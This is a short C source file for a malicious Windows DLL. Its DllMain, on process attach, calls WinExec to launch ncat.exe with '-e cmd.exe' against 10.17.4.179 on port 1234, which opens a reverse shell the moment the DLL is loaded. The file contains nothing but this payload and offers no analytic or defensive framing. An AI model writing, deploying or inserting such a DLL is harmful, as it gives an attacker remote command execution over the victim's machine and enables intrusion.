#include <windows.h>


void exec_custom()
{
	WinExec("c:\\users\\hugo\\Downloads\\ncat.exe -e cmd.exe 10.17.4.179 1234", 1);
}

bool APIENTRY DllMain( HMODULE hModule,
			DWORD ul_reason_for_call,
			LPVOID lpReserved
		)
{
	switch(ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		exec_custom();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return true;
}
